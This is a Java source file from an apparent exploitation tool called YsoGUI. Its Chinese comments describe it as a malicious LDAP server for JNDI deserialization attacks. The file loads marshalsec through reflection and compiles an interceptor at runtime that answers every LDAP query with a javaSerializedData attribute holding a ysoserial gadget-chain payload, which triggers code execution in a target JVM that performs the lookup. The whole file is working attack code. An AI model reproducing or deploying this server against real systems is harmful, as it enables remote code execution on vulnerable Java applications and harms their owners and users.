package ysogui.core;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;
import java.io.File;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.function.Consumer;

/**
 * 自定义 LDAP 服务器，用于 JNDI 反序列化攻击。
 *
 * 在 LDAP 搜索响应中直接返回 javaSerializedData 属性，
 * 目标 JVM 反序列化该数据，触发 ysoserial gadget 链。
 */
public class LdapDeserialServer {

    private static final String INTERCEPTOR_CLASS_NAME = "ysogui.dynamic.LdapDeserialInterceptor";

    private final String bindAddr;
    private final int port;
    private final byte[] serializedPayload;
    private final String chainName;
    private final Consumer<String> logger;
    private final ClassLoader baseClassLoader;

    private volatile Object directoryServer;
    private volatile boolean running;

    public LdapDeserialServer(String bindAddr, int port, byte[] serializedPayload,
                              String chainName, Consumer<String> logger,
                              ClassLoader baseClassLoader) {
        this.bindAddr = bindAddr;
        this.port = port;
        this.serializedPayload = serializedPayload;
        this.chainName = chainName;
        this.logger = logger;
        this.baseClassLoader = baseClassLoader;
    }

    public void start() throws Exception {
        ClassLoader threadCl = (baseClassLoader != null)
            ? baseClassLoader
            : Thread.currentThread().getContextClassLoader();
        URL marshalsecUrl = findMarshalsecUrl(threadCl);
        if (marshalsecUrl == null) {
            throw new Exception("未找到 marshalsec jar，请先加载 marshalsec jar");
        }

        ClassLoader serverCl = buildServerClassLoader(threadCl, marshalsecUrl);
        ClassLoader originalCl = Thread.currentThread().getContextClassLoader();
        Thread.currentThread().setContextClassLoader(serverCl);
        try {
            Object config = createServerConfig(serverCl);
            Object interceptor = buildInterceptor(serverCl, marshalsecUrl);
            Class<?> interceptorClass = serverCl.loadClass(
                "com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor");
            config.getClass().getMethod("addInMemoryOperationInterceptor", interceptorClass)
                .invoke(config, interceptor);

            Object server = serverCl.loadClass("com.unboundid.ldap.listener.InMemoryDirectoryServer")
                .getConstructor(config.getClass())
                .newInstance(config);
            server.getClass().getMethod("startListening").invoke(server);

            this.directoryServer = server;
            this.running = true;

            logger.accept("[LDAP-Deser] 服务已启动: " + bindAddr + ":" + port);
            logger.accept("[LDAP-Deser] Payload: " + chainName + " (" + serializedPayload.length + " bytes)");

            while (running) {
                Thread.sleep(250L);
            }
        } finally {
            Thread.currentThread().setContextClassLoader(originalCl);
        }
    }

    private Object createServerConfig(ClassLoader cl) throws Exception {
        Class<?> configClass = cl.loadClass("com.unboundid.ldap.listener.InMemoryDirectoryServerConfig");
        Object config = configClass.getConstructor(String[].class)
            .newInstance((Object) new String[]{"dc=example,dc=com"});

        Class<?> listenerConfigClass = cl.loadClass("com.unboundid.ldap.listener.InMemoryListenerConfig");
        InetAddress addr = "0.0.0.0".equals(bindAddr) ? null : InetAddress.getByName(bindAddr);
        Object listenerConfig = listenerConfigClass
            .getMethod("createLDAPConfig", String.class, InetAddress.class, int.class,
                javax.net.ssl.SSLSocketFactory.class)
            .invoke(null, "listen", addr, port, null);

        configClass.getMethod("setListenerConfigs", java.util.Collection.class)
            .invoke(config, java.util.Collections.singletonList(listenerConfig));
        configClass.getMethod("setSchema",
            cl.loadClass("com.unboundid.ldap.sdk.schema.Schema")).invoke(config, new Object[]{null});
        return config;
    }

    private Object buildInterceptor(ClassLoader parentCl, URL marshalsecUrl) throws Exception {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        if (compiler == null) {
            throw new Exception("当前运行环境缺少 JavaCompiler，请使用 JDK 运行 YsoGUI");
        }

        Path tempDir = Files.createTempDirectory("ysogui-ldap-");
        try {
            Path pkgDir = tempDir.resolve("ysogui").resolve("dynamic");
            Files.createDirectories(pkgDir);

            Path javaFile = pkgDir.resolve("LdapDeserialInterceptor.java");
            Files.write(javaFile, buildInterceptorSource().getBytes(StandardCharsets.UTF_8));

            String classPath = marshalsecUrlToPath(marshalsecUrl)
                + File.pathSeparator + System.getProperty("java.class.path", ".");
            int exitCode = compiler.run(null, null, null,
                "-encoding", "UTF-8",
                "-classpath", classPath,
                "-d", tempDir.toString(),
                javaFile.toString());
            if (exitCode != 0) {
                throw new Exception("动态编译 LDAP 拦截器失败，exitCode=" + exitCode);
            }

            URLClassLoader interceptorCl = new URLClassLoader(
                new URL[]{tempDir.toUri().toURL(), marshalsecUrl}, parentCl);
            Class<?> clazz = interceptorCl.loadClass(INTERCEPTOR_CLASS_NAME);
            return clazz.getConstructor(byte[].class, Consumer.class)
                .newInstance(serializedPayload, logger);
        } finally {
            FileCleanup.deleteRecursivelyQuietly(tempDir);
        }
    }

    private URLClassLoader buildServerClassLoader(ClassLoader parent, URL marshalsecUrl) {
        return new URLClassLoader(new URL[]{marshalsecUrl}, parent);
    }

    private URL findMarshalsecUrl(ClassLoader cl) {
        if (!(cl instanceof URLClassLoader)) {
            return null;
        }
        for (URL url : ((URLClassLoader) cl).getURLs()) {
            String path = url.getPath();
            if (path != null && path.toLowerCase().contains("marshalsec")) {
                return url;
            }
        }
        return null;
    }

    private String marshalsecUrlToPath(URL url) {
        try {
            return new File(url.toURI()).getAbsolutePath();
        } catch (Exception ignored) {
            return url.getPath();
        }
    }

    private String buildInterceptorSource() {
        return "package ysogui.dynamic;\n"
            + "import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;\n"
            + "import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;\n"
            + "import com.unboundid.ldap.sdk.Entry;\n"
            + "import com.unboundid.ldap.sdk.LDAPResult;\n"
            + "import com.unboundid.ldap.sdk.ResultCode;\n"
            + "import java.util.function.Consumer;\n"
            + "public class LdapDeserialInterceptor extends InMemoryOperationInterceptor {\n"
            + "  private final byte[] payload;\n"
            + "  private final Consumer<String> logger;\n"
            + "  public LdapDeserialInterceptor(byte[] payload, Consumer<String> logger) {\n"
            + "    this.payload = payload;\n"
            + "    this.logger = logger;\n"
            + "  }\n"
            + "  @Override\n"
            + "  public void processSearchResult(InMemoryInterceptedSearchResult result) {\n"
            + "    try {\n"
            + "      String base = result.getRequest().getBaseDN();\n"
            + "      if (logger != null) logger.accept(\"[LDAP-Deser] 收到查询: baseDN=\" + base);\n"
            + "      Entry entry = new Entry(base);\n"
            + "      entry.addAttribute(\"javaClassName\", \"java.lang.String\");\n"
            + "      entry.addAttribute(\"javaSerializedData\", payload);\n"
            + "      result.sendSearchEntry(entry);\n"
            + "      result.setResult(new LDAPResult(0, ResultCode.SUCCESS));\n"
            + "      if (logger != null) logger.accept(\"[LDAP-Deser] 已返回 javaSerializedData: \" + payload.length + \" bytes\");\n"
            + "    } catch (Exception e) {\n"
            + "      throw new RuntimeException(e);\n"
            + "    }\n"
            + "  }\n"
            + "}\n";
    }

    public void stop() {
        running = false;
        if (directoryServer != null) {
            try {
                directoryServer.getClass().getMethod("shutDown", boolean.class)
                    .invoke(directoryServer, true);
            } catch (Exception ignored) {
            }
            directoryServer = null;
        }
    }

    public boolean isRunning() {
        return running;
    }
}
